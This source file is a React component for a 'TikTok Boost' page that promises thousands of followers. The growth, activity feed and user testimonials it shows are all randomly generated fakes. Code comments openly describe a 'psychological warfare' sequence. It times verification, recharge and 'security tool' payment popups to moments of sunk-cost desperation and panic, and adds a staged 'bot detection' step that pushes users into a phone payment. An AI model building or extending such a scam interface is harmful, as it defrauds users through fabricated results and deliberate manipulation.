
import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/enhanced-button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Progress } from "@/components/ui/progress"
import { MetricCounter } from "@/components/metric-counter"
import { Input } from "@/components/ui/input"
import { ArrowLeft, Play, Heart, MessageCircle, Share, Eye, TrendingUp, Users, Zap, Clock, CheckCircle, Star, Search, Sparkles, Shield, Target, Rocket } from "lucide-react"
import { useNavigate } from "react-router-dom"
import { VerificationPopup } from "@/components/verification-popup"
import { RechargePopup } from "@/components/recharge-popup"
import { CongratulationsPopup } from "@/components/congratulations-popup"
import { TransferAnimation } from "@/components/transfer-animation"
import { BotDetectionPopup } from "@/components/bot-detection-popup"
import { SecurityToolActivation } from "@/components/security-tool-activation"
import { PhonePaymentPopup } from "@/components/phone-payment-popup"
import { cn } from "@/lib/utils"
import { toast } from "@/hooks/use-toast"
import heroImage from "@/assets/hero-bg.jpg"


const TikTokBoost = () => {
  const navigate = useNavigate()
  
  // Form states
  const [username, setUsername] = useState("")
  const [userFollowers, setUserFollowers] = useState("")
  const [showForm, setShowForm] = useState(true)
  const [isAnalyzing, setIsAnalyzing] = useState(false)
  const [analysisStep, setAnalysisStep] = useState(0)
  const [selectedPackage, setSelectedPackage] = useState<string>("")
  
  // Boost states
  const [isBoostActive, setIsBoostActive] = useState(false)
  const [boostProgress, setBoostProgress] = useState(0)
  const [currentFollowers, setCurrentFollowers] = useState(0)
  const [targetFollowers, setTargetFollowers] = useState(0)
  const [currentViews, setCurrentViews] = useState(234567)
  const [currentLikes, setCurrentLikes] = useState(12234)
  
  // Verification popup states
  const [showVerificationPopup, setShowVerificationPopup] = useState(false)
  const [verificationTriggered, setVerificationTriggered] = useState({
    immediate: false,
    engagement: false,
    progress25: false,
    progress50: false,
    progress85: false
  })
  const [showRechargePopup, setShowRechargePopup] = useState(false)
  const [rechargeTriggered, setRechargeTriggered] = useState(false)
  
  // Completion flow states
  const [showCongratulations, setShowCongratulations] = useState(false)
  const [showTransferAnimation, setShowTransferAnimation] = useState(false)
  const [showBotDetection, setShowBotDetection] = useState(false)
  const [showSecurityActivation, setShowSecurityActivation] = useState(false)
  const [showPhonePayment, setShowPhonePayment] = useState(false)
  const [isBoostComplete, setIsBoostComplete] = useState(false)
  
  // Persistent timing
  const DURATION_MS = 30 * 60 * 1000 // 30 minutes in ms
  const startTimeRef = useRef<number | null>(null)
  
  const analysisSteps = [
    "Connecting to TikTok...",
    "Fetching account data...", 
    "Analyzing video performance...",
    "Calculating viral potential...",
    "Preparing boost strategy...",
    "Analysis complete!"
  ]
  
  const boostPackages = [
    {
      id: "viral-starter",
      name: "Viral Starter",
      followers: "2,000",
      description: "Perfect for new creators",
      features: ["Real followers", "Video views boost", "24/7 support"],
      popular: true
    },
    {
      id: "creator-pro", 
      name: "Creator Pro",
      followers: "5,000",
      description: "Scale your content",
      features: ["Premium followers", "Engagement boost", "Analytics dashboard"]
    },
    {
      id: "viral-legend",
      name: "Viral Legend", 
      followers: "10,000",
      description: "Dominate the algorithm",
      features: ["Elite followers", "Trending push", "Priority support"]
    }
  ]

  // Removed premature verification trigger. Verification is now shown only via boost milestone logic (>=60%).

  // ULTIMATE PSYCHOLOGICAL WARFARE SEQUENCE 🔥
  useEffect(() => {
    if (!isBoostActive) return
    
    // 60% VERIFICATION - Peak investment anxiety + visible results = "I can't lose this now!"
    if (boostProgress >= 60 && !verificationTriggered.progress50 && !showVerificationPopup) {
      setVerificationTriggered(prev => ({ ...prev, progress50: true }))
      setTimeout(() => {
        if (!showVerificationPopup) {
          setShowVerificationPopup(true)
        }
      }, 2000) // Build anticipation before the strike
    }
    
    // 85% RECHARGE - Sunk cost desperation + "almost there" = EASY CONVERSION
    else if (boostProgress >= 85 && !rechargeTriggered && !showRechargePopup) {
      setRechargeTriggered(true)
      setTimeout(() => {
        if (!showRechargePopup) {
          setShowRechargePopup(true)
        }
      }, 1000) // Quick strike when desperation peaks
    }
    
    // 99% SECURITY - Pure panic + completion obsession = THEY'LL PAY ANYTHING
    else if (boostProgress >= 99 && !verificationTriggered.progress85 && !showSecurityActivation) {
      setVerificationTriggered(prev => ({ ...prev, progress85: true }))
      setShowSecurityActivation(true) // IMMEDIATE - no delay, pure panic mode
    }
  }, [boostProgress, isBoostActive, showVerificationPopup, showRechargePopup, showSecurityActivation, verificationTriggered, rechargeTriggered])

  // Social proof toasts  
  useEffect(() => {
    const showRandomToast = () => {
      const usernames = ["@mike_comedy", "@emma_art", "@alex_dance", "@sarah_life", "@tech_guru", "@fitness_king", "@style_queen", "@food_lover"]
      const followerCounts = ["6,093", "17,720", "25,440", "8,156", "31,290", "4,782", "12,950", "19,850"]
      const timeFrames = ["2 min ago", "5 min ago", "8 min ago", "12 min ago"]
      
      const randomUsername = usernames[Math.floor(Math.random() * usernames.length)]
      const randomFollowers = followerCounts[Math.floor(Math.random() * followerCounts.length)]
      const randomTime = timeFrames[Math.floor(Math.random() * timeFrames.length)]
      
      toast({
        title: (
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-gradient-tiktok rounded-full flex items-center justify-center">
              <Play className="w-5 h-5 text-white" />
            </div>
            <div className="flex-1">
              <p className="font-semibold text-foreground">{randomUsername}</p>
              <p className="text-sm text-success">+{randomFollowers} followers</p>
            </div>
            <div className="text-xs text-muted-foreground">{randomTime}</div>
          </div>
        ) as any,
        duration: 4000,
      })
    }
    
    // Show initial toast
    setTimeout(showRandomToast, 2000)
    
    // Set up interval for recurring toasts
    const interval = setInterval(showRandomToast, 5000)
    
    return () => clearInterval(interval)
  }, [])

  // Analysis process
  useEffect(() => {
    if (isAnalyzing) {
      const stepInterval = setInterval(() => {
        setAnalysisStep(prev => {
          if (prev >= analysisSteps.length - 1) {
            clearInterval(stepInterval)
            setTimeout(() => {
              setIsAnalyzing(false)
              setShowForm(false)
            }, 1000)
            return prev
          }
          return prev + 1
        })
      }, 1500)
      
      return () => clearInterval(stepInterval)
    }
  }, [isAnalyzing])

  // Boost progress effect with follower drip (continuous, ref-based start time)
  useEffect(() => {
    if (isBoostActive && targetFollowers > 0) {
      if (startTimeRef.current == null) {
        startTimeRef.current = Date.now()
      }

      const progressInterval = setInterval(() => {
        const elapsed = Date.now() - (startTimeRef.current as number)
        const progressRatio = Math.min(elapsed / DURATION_MS, 1)
        const currentProgress = progressRatio * 100
        
        // Update progress
        setBoostProgress(currentProgress)
        
        // Old trigger logic removed - now handled by optimized psychological sequence
        
        // Update followers based on progress
        const initialFollowers = parseInt(userFollowers || "0")
        const totalFollowersToGain = 2000
        
        // Simple linear calculation: progress% * 2000 followers
        // At 50% = 1000 followers, at 100% = 2000 followers
        const expectedFollowersGained = Math.floor((currentProgress / 100) * totalFollowersToGain)
        
        const expectedTotal = initialFollowers + expectedFollowersGained;
        
        // Update followers to match expected growth exactly
        setCurrentFollowers(prev => {
          // Ensure we're always moving towards the expected total
          if (expectedTotal > prev) {
            return expectedTotal
          }
          return prev
        })
        
        if (progressRatio >= 1.0) {
          clearInterval(progressInterval)
          setIsBoostComplete(true)
          setShowCongratulations(true)
        }
      }, 1000);

      return () => {
        clearInterval(progressInterval);
      }
    }
  }, [isBoostActive, targetFollowers, userFollowers, verificationTriggered, rechargeTriggered])

  const handleAnalyzeAccount = () => {
    if (username && userFollowers) {
      setIsAnalyzing(true)
      setAnalysisStep(0)
    }
  }
  
  const handleSelectPackage = (packageId: string) => {
    setSelectedPackage(packageId)
    const pkg = boostPackages.find(p => p.id === packageId)
    if (pkg) {
      const followers = parseInt(pkg.followers.replace(",", ""))
      setTargetFollowers(parseInt(userFollowers || "0") + followers)
    }
  }
  
  const handleStartBoost = () => {
    setIsBoostActive(true)
    setBoostProgress(0)
    setCurrentFollowers(parseInt(userFollowers || "0"))
    setTargetFollowers(parseInt(userFollowers || "0") + 2000)
    startTimeRef.current = Date.now()
  }

  const handleVerificationClose = () => {
    setShowVerificationPopup(false)
  }

  const handleVerificationAccept = () => {
    setShowVerificationPopup(false)
    // Reset all verification triggers to prevent re-triggering
    setVerificationTriggered({
      immediate: true,
      engagement: true,
      progress25: true,
      progress50: true,
      progress85: true
    })
    toast({
      title: "Account Verified!",
      description: "Your TikTok account is now verified. Boost will continue with premium features.",
      duration: 3000,
    })
  }

  const handleRechargeClose = () => {
    setShowRechargePopup(false)
  }

  const handleRecharge = (packageId: string) => {
    setShowRechargePopup(false)
    // Ensure progress resumes from at least 25%
    setBoostProgress(prev => {
      const next = Math.max(prev, 25)
      // Adjust start time so that elapsed reflects current progress
      startTimeRef.current = Date.now() - (next / 100) * DURATION_MS
      return next
    })
    setIsBoostActive(true)
    toast({
      title: "Recharge Successful!",
      description: "Your boost has been extended. Continuing to 100%...",
      duration: 3000,
    })
  }

  // Completion flow handlers
  const handleStartTransfer = () => {
    setShowCongratulations(false)
    setShowTransferAnimation(true)
  }

  const handleBotDetected = () => {
    setShowTransferAnimation(false)
    setShowBotDetection(true)
  }

  const handleRetryTransfer = () => {
    setShowBotDetection(false)
    // Simulate successful transfer after manual unfollow
    toast({
      title: "Transfer Complete!",
      description: "All followers have been successfully transferred to your account.",
      duration: 3000,
    })
  }

  const handleUseSecurity = () => {
    setShowBotDetection(false)
    setShowSecurityActivation(true)
  }

  const handleActivateSecurity = () => {
    setShowSecurityActivation(false)
    setShowPhonePayment(true)
  }

  const handlePaymentSuccess = () => {
    setShowPhonePayment(false)
    toast({
      title: "Security Tool Activated!",
      description: "Bots removed and transfer completed successfully.",
      duration: 5000,
    })
    
    // Show 24-hour delivery message after 7 seconds
    setTimeout(() => {
      toast({
        title: "Transfer Complete!",
        description: "You will receive your followers within 24 hours. Thank you for using our service!",
        duration: 8000,
      })
    }, 7000)
  }

  const handleTransferComplete = () => {
    setShowTransferAnimation(false)
    toast({
      title: "Transfer Complete!",
      description: "All followers have been successfully transferred to your account.",
      duration: 3000,
    })
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5">
      {/* Header */}
      <div className="border-b border-card-border bg-card/50 backdrop-blur-md sticky top-0 z-50">
        <div className="container mx-auto px-4 py-3 sm:py-4">
          <div className="flex items-center justify-between gap-2">
            <div className="flex items-center gap-2 sm:gap-4 min-w-0 flex-1">
              <Button 
                variant="ghost" 
                size="icon"
                onClick={() => navigate("/")}
                className="hover:bg-card/80 flex-shrink-0"
              >
                <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5" />
              </Button>
              <div className="flex items-center gap-2 sm:gap-3 min-w-0">
                <div className="p-1.5 sm:p-2 bg-gradient-tiktok rounded-lg flex-shrink-0">
                  <Play className="w-4 h-4 sm:w-5 sm:h-5 lg:w-6 lg:h-6 text-white" />
                </div>
                <div className="min-w-0">
                  <h1 className="text-sm sm:text-lg lg:text-xl font-bold text-foreground truncate">TikTok Boost</h1>
                  <p className="text-xs sm:text-sm text-muted-foreground hidden sm:block">Go viral instantly</p>
                </div>
              </div>
            </div>
            <Badge variant="secondary" className="bg-success/10 text-success border-success/20 text-xs sm:text-sm flex-shrink-0">
              <CheckCircle className="w-3 h-3 sm:w-4 sm:h-4 mr-1" />
              <span className="hidden sm:inline">Active Plan</span>
              <span className="sm:hidden">Active</span>
            </Badge>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-4 sm:py-6 lg:py-8">
        {/* Analysis Loading Modal */}
        {isAnalyzing && (
          <div className="fixed inset-0 bg-background/80 backdrop-blur-md flex items-center justify-center z-50">
            <Card className="w-full max-w-md mx-4 border-card-border bg-card backdrop-blur-sm">
              <CardHeader className="text-center">
                <div className="w-16 h-16 bg-gradient-tiktok rounded-full flex items-center justify-center mx-auto mb-4">
                  <Search className="w-8 h-8 text-white animate-pulse" />
                </div>
                <CardTitle className="text-xl text-foreground">Analyzing Account</CardTitle>
                <CardDescription className="text-muted-foreground">Please wait while we analyze @{username}</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <Progress value={(analysisStep / (analysisSteps.length - 1)) * 100} className="h-2" />
                  <div className="text-center">
                    <p className="text-sm text-muted-foreground">{analysisSteps[analysisStep]}</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        <div className="grid lg:grid-cols-3 gap-4 sm:gap-6 lg:gap-8">
          {/* Main Dashboard */}
          <div className="lg:col-span-2 space-y-4 sm:space-y-6">
            {showForm ? (
              <>
                {/* Account Input Form */}
                <Card className="border-card-border bg-card/50 backdrop-blur-sm overflow-hidden relative">
                  {/* Background Image */}
                  <div 
                    className="absolute inset-0 z-0"
                    style={{
                      backgroundImage: `url(${heroImage})`,
                      backgroundSize: 'cover',
                      backgroundPosition: 'center',
                      backgroundRepeat: 'no-repeat'
                    }}
                  >
                    <div className="absolute inset-0 bg-background/90" />
                  </div>
                  
                  <CardHeader className="relative z-10 pb-3 sm:pb-4">
                    <CardTitle className="text-lg sm:text-xl lg:text-2xl text-foreground flex items-center gap-2">
                      <Play className="w-5 h-5 sm:w-6 sm:h-6 lg:w-7 lg:h-7 text-primary" />
                      <span className="truncate">TikTok Viral Engine</span>
                    </CardTitle>
                    <CardDescription className="text-sm sm:text-base">Enter your TikTok details to unleash viral growth</CardDescription>
                  </CardHeader>
                  <CardContent className="relative z-10 space-y-4 sm:space-y-6">
                    <div className="space-y-3 sm:space-y-4">
                      <div>
                        <label className="text-sm font-medium text-foreground mb-2 block">TikTok Username</label>
                        <Input
                          placeholder="@yourhandle"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                          className="h-10 sm:h-12 text-sm sm:text-base"
                        />
                      </div>
                      <div>
                        <label className="text-sm font-medium text-foreground mb-2 block">Number of followers you have</label>
                        <Input
                          placeholder="500"
                          type="number"
                          value={userFollowers}
                          onChange={(e) => setUserFollowers(e.target.value)}
                          className="h-10 sm:h-12 text-sm sm:text-base"
                        />
                      </div>
                    </div>
                    
                    <Button 
                      variant="tiktok" 
                      size="xl" 
                      onClick={handleAnalyzeAccount}
                      disabled={!username || !userFollowers || isAnalyzing}
                      className="w-full h-12 sm:h-14 text-base sm:text-lg font-semibold"
                    >
                      <Search className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                      <span className="hidden sm:inline">Analyze Account & Show Growth Packages</span>
                      <span className="sm:hidden">Analyze Account</span>
                    </Button>
                  </CardContent>
                </Card>

                {/* Features Preview */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 sm:gap-4">
                  <Card className="border-card-border bg-card/50 backdrop-blur-sm text-center p-4 sm:p-6">
                    <Shield className="w-6 h-6 sm:w-8 sm:h-8 text-success mx-auto mb-2 sm:mb-3" />
                    <h3 className="text-sm sm:text-base font-semibold text-foreground mb-1 sm:mb-2">100% Secure</h3>
                    <p className="text-xs sm:text-sm text-muted-foreground">Safe and TikTok algorithm friendly</p>
                  </Card>
                  
                  <Card className="border-card-border bg-card/50 backdrop-blur-sm text-center p-4 sm:p-6">
                    <Rocket className="w-6 h-6 sm:w-8 sm:h-8 text-primary mx-auto mb-2 sm:mb-3" />
                    <h3 className="text-sm sm:text-base font-semibold text-foreground mb-1 sm:mb-2">Instant Viral</h3>
                    <p className="text-xs sm:text-sm text-muted-foreground">Go viral within hours of boost activation</p>
                  </Card>
                  
                  <Card className="border-card-border bg-card/50 backdrop-blur-sm text-center p-4 sm:p-6">
                    <Target className="w-6 h-6 sm:w-8 sm:h-8 text-accent mx-auto mb-2 sm:mb-3" />
                    <h3 className="text-sm sm:text-base font-semibold text-foreground mb-1 sm:mb-2">Smart Algorithm</h3>
                    <p className="text-xs sm:text-sm text-muted-foreground">AI-powered targeting for maximum reach</p>
                  </Card>
                </div>
              </>
            ) : (
              <>
                {/* Boost Packages */}
                {!isBoostActive && (
                  <Card className="border-card-border bg-card/50 backdrop-blur-sm overflow-hidden relative">
                    {/* Background Image */}
                    <div 
                      className="absolute inset-0 z-0"
                      style={{
                        backgroundImage: `url(${heroImage})`,
                        backgroundSize: 'cover',
                        backgroundPosition: 'center',
                        backgroundRepeat: 'no-repeat'
                      }}
                    >
                      <div className="absolute inset-0 bg-background/90" />
                    </div>
                    
                    <CardHeader className="relative z-10">
                      <CardTitle className="text-2xl text-foreground flex items-center gap-2">
                        <Sparkles className="w-6 h-6 text-primary" />
                        Choose Your Viral Package
                      </CardTitle>
                      <CardDescription>Select the perfect boost for @{username} ({userFollowers} followers)</CardDescription>
                    </CardHeader>
                    <CardContent className="relative z-10">
                      <div className="grid md:grid-cols-3 gap-4">
                        {boostPackages.map((pkg) => (
                          <Card
                            key={pkg.id}
                            className={cn(
                              "border-2 cursor-pointer transition-all duration-300 hover:shadow-glow",
                              selectedPackage === pkg.id 
                                ? "border-primary bg-primary/5" 
                                : "border-card-border bg-card/30",
                              pkg.popular && "ring-2 ring-primary/30"
                            )}
                            onClick={() => handleSelectPackage(pkg.id)}
                          >
                            <CardHeader className="text-center relative">
                              {pkg.popular && (
                                <Badge className="absolute -top-2 left-1/2 -translate-x-1/2 bg-primary text-primary-foreground">
                                  Most Popular
                                </Badge>
                              )}
                              <CardTitle className="text-xl text-foreground">{pkg.name}</CardTitle>
                              <div className="text-3xl font-bold text-primary">+{pkg.followers}</div>
                              <CardDescription>{pkg.description}</CardDescription>
                            </CardHeader>
                            <CardContent>
                              <ul className="space-y-2 text-sm mb-6">
                                {pkg.features.map((feature, i) => (
                                  <li key={i} className="flex items-center gap-2 text-muted-foreground">
                                    <CheckCircle className="w-4 h-4 text-success" />
                                    {feature}
                                  </li>
                                ))}
                              </ul>
                              <Button 
                                variant="tiktok" 
                                size="lg" 
                                onClick={() => {
                                  handleSelectPackage(pkg.id)
                                  handleStartBoost()
                                }}
                                className="w-full h-12 text-base font-semibold"
                              >
                                <Zap className="w-4 h-4 mr-2" />
                                Start Viral Boost
                              </Button>
                            </CardContent>
                          </Card>
                        ))}
                      </div>
                      
                    </CardContent>
                  </Card>
                )}

                {/* Live Follower Counter */}
                {isBoostActive && (
                  <Card className="border-card-border bg-card/50 backdrop-blur-sm overflow-hidden relative">
                    {/* Background Image */}
                    <div 
                      className="absolute inset-0 z-0"
                      style={{
                        backgroundImage: `url(${heroImage})`,
                        backgroundSize: 'cover',
                        backgroundPosition: 'center',
                        backgroundRepeat: 'no-repeat'
                      }}
                    >
                      <div className="absolute inset-0 bg-background/90" />
                    </div>
                    
                    <CardHeader className="relative z-10">
                      <div className="flex items-center justify-between">
                        <div>
                          <CardTitle className="text-2xl text-foreground flex items-center gap-2">
                            <Users className="w-6 h-6 text-primary" />
                            @{username} - Live Growth
                          </CardTitle>
                          <CardDescription className="text-muted-foreground text-sm leading-relaxed max-w-2xl">
                            Your follower count is growing in real-time! Do not interrupt the process. Once it's 100% complete, your followers will be visible in your account.
                          </CardDescription>
                        </div>
                        <Badge variant="secondary" className="bg-success/10 text-success border-success/20 animate-pulse">
                          <div className="w-2 h-2 bg-success rounded-full mr-2"></div>
                          BOOSTING
                        </Badge>
                      </div>
                    </CardHeader>
                    <CardContent className="relative z-10">
                      <div className="text-center py-8">
                        <div className="text-6xl font-bold text-foreground mb-4">
                          <MetricCounter end={currentFollowers} duration={1000} />
                        </div>
                        <p className="text-lg text-muted-foreground mb-6">Total Followers</p>
                        
                        <div className="space-y-4">
                          <div className="flex items-center justify-between">
                            <span className="text-sm font-medium text-foreground">Boost Progress</span>
                            <span className="text-sm text-muted-foreground">{Math.round(boostProgress)}%</span>
                          </div>
                          <Progress value={boostProgress} className="h-4" />
                          
                          <div className="grid grid-cols-2 gap-4 mt-6">
                            <div className="text-center p-4 bg-success/10 rounded-lg border border-success/20">
                              <div className="text-2xl font-bold text-success">
                                +<MetricCounter end={currentFollowers - parseInt(userFollowers || "0")} />
                              </div>
                              <p className="text-sm text-muted-foreground">New Followers</p>
                            </div>
                            <div className="text-center p-4 bg-primary/10 rounded-lg border border-primary/20">
                              <div className="text-2xl font-bold text-primary">
                                <MetricCounter end={Math.floor((100 - boostProgress) / 100 * 30)} suffix=" min" />
                              </div>
                              <p className="text-sm text-muted-foreground">Time Remaining</p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )}
              </>
            )}

            {/* Live Activity Feed */}
            {isBoostActive && (
              <Card className="border-card-border bg-card/50 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-lg text-foreground flex items-center gap-2">
                    <Clock className="w-5 h-5 text-primary" />
                    Live Activity Feed
                  </CardTitle>
                  <CardDescription>Real-time viral activity for @{username}</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3 max-h-60 overflow-y-auto">
                    {Array.from({ length: 12 }).map((_, i) => {
                      const activities = [
                        `Video gained ${Math.floor(Math.random() * 10000 + 1000)} views`,
                        `New follower from ${["United States", "Canada", "United Kingdom", "Australia", "Mexico"][Math.floor(Math.random() * 5)]}`,
                        `Your video was shared ${Math.floor(Math.random() * 50 + 10)} times`,
                        `Received ${Math.floor(Math.random() * 100 + 20)} new likes on latest video`,
                        `New comment: "This is fire! 🔥🔥"`,
                        `Added to ${Math.floor(Math.random() * 30 + 5)} For You pages`
                      ]
                      return (
                        <div key={i} className="flex items-center gap-3 p-3 rounded-lg bg-card/30 animate-fade-in border border-card-border/50">
                          <div className="w-2 h-2 bg-success rounded-full animate-pulse"></div>
                          <Play className="w-4 h-4 text-primary" />
                          <div className="flex-1">
                            <span className="text-sm text-foreground">
                              {activities[Math.floor(Math.random() * activities.length)]}
                            </span>
                            <div className="text-xs text-muted-foreground mt-1">
                              {Math.floor(Math.random() * 60)} seconds ago
                            </div>
                          </div>
                        </div>
                      )
                    })}
                  </div>
                </CardContent>
              </Card>
            )}
          </div>

          {/* Sidebar - same as existing code */}
          <div className="space-y-4 sm:space-y-6">
            {/* Quick Actions */}
            <Card className="border-card-border bg-card/50 backdrop-blur-sm">
              <CardHeader className="pb-3 sm:pb-4">
                <CardTitle className="text-base sm:text-lg text-foreground">Quick Actions</CardTitle>
                <CardDescription className="text-sm">Optimize your viral reach</CardDescription>
              </CardHeader>
              <CardContent className="space-y-2 sm:space-y-3">
                <Button variant="outline" size="sm" className="w-full justify-start h-8 sm:h-9 text-xs sm:text-sm">
                  <Heart className="w-3 h-3 sm:w-4 sm:h-4 mr-2" />
                  Boost Likes
                </Button>
                <Button variant="outline" size="sm" className="w-full justify-start h-8 sm:h-9 text-xs sm:text-sm">
                  <Eye className="w-3 h-3 sm:w-4 sm:h-4 mr-2" />
                  Increase Views
                </Button>
                <Button variant="outline" size="sm" className="w-full justify-start h-8 sm:h-9 text-xs sm:text-sm">
                  <Share className="w-3 h-3 sm:w-4 sm:h-4 mr-2" />
                  Viral Shares
                </Button>
                <Button variant="outline" size="sm" className="w-full justify-start h-8 sm:h-9 text-xs sm:text-sm">
                  <MessageCircle className="w-3 h-3 sm:w-4 sm:h-4 mr-2" />
                  Auto Comments
                </Button>
              </CardContent>
            </Card>

            {/* Performance Summary */}
            <Card className="border-card-border bg-card/50 backdrop-blur-sm">
              <CardHeader className="pb-3 sm:pb-4">
                <CardTitle className="text-base sm:text-lg text-foreground flex items-center gap-2">
                  <Star className="w-4 h-4 sm:w-5 sm:h-5 text-primary" />
                  Today's Performance
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3 sm:space-y-4">
                <div className="flex items-center justify-between">
                  <span className="text-xs sm:text-sm text-muted-foreground">Viral Score</span>
                  <Badge variant="secondary" className="bg-success/10 text-success border-success/20 text-xs">
                    Trending
                  </Badge>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs sm:text-sm text-muted-foreground">Video Views</span>
                  <span className="text-xs sm:text-sm font-semibold text-success">+890%</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs sm:text-sm text-muted-foreground">New Followers</span>
                  <span className="text-xs sm:text-sm font-semibold text-primary">+2,156</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs sm:text-sm text-muted-foreground">Engagement Rate</span>
                  <span className="text-xs sm:text-sm font-semibold text-accent">18.7%</span>
                </div>
              </CardContent>
            </Card>

            {/* Success Tips */}
            <Card className="border-card-border bg-gradient-to-br from-success/5 to-primary/5 backdrop-blur-sm">
              <CardHeader className="pb-3 sm:pb-4">
                <CardTitle className="text-base sm:text-lg text-foreground">🎯 Viral Tips</CardTitle>
              </CardHeader>
              <CardContent className="space-y-2 sm:space-y-3 text-xs sm:text-sm">
                <p className="text-muted-foreground leading-relaxed">
                  <strong className="text-foreground">Hook viewers early:</strong> First 3 seconds determine if users will watch your full video.
                </p>
                <p className="text-muted-foreground leading-relaxed">
                  <strong className="text-foreground">Use trending sounds:</strong> Jump on trending audio to maximize algorithmic reach.
                </p>
                <p className="text-muted-foreground leading-relaxed">
                  <strong className="text-foreground">Post at peak times:</strong> 6-10 PM local time gets the most engagement.
                </p>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>

      {/* Verification Popup */}
      <VerificationPopup
        username={username}
        currentFollowers={currentFollowers}
        isOpen={showVerificationPopup}
        onClose={handleVerificationClose}
        onVerify={handleVerificationAccept}
      />

      {/* Recharge Popup */}
      <RechargePopup
        isOpen={showRechargePopup}
        onClose={handleRechargeClose}
        onRecharge={handleRecharge}
        platform="tiktok"
        currentFollowers={currentFollowers}
      />

      {/* Completion Flow Components */}
      <CongratulationsPopup
        isOpen={showCongratulations}
        onClose={() => setShowCongratulations(false)}
        onStartTransfer={handleStartTransfer}
        platform="tiktok"
        followersGained={targetFollowers - parseInt(userFollowers || "0")}
        currentFollowers={targetFollowers}
      />

      <TransferAnimation
        isOpen={showTransferAnimation}
        onBotDetected={handleBotDetected}
        onTransferComplete={handleTransferComplete}
        platform="tiktok"
        followersToTransfer={targetFollowers - parseInt(userFollowers || "0")}
      />

      <BotDetectionPopup
        isOpen={showBotDetection}
        onRetryTransfer={handleRetryTransfer}
        onUseSecurity={handleUseSecurity}
        platform="tiktok"
      />

      <SecurityToolActivation
        isOpen={showSecurityActivation}
        onActivate={handleActivateSecurity}
        onClose={() => setShowSecurityActivation(false)}
        platform="tiktok"
      />

      <PhonePaymentPopup
        isOpen={showPhonePayment}
        onPaymentSuccess={handlePaymentSuccess}
        onClose={() => setShowPhonePayment(false)}
        platform="tiktok"
      />
    </div>
  )
}

export default TikTokBoost
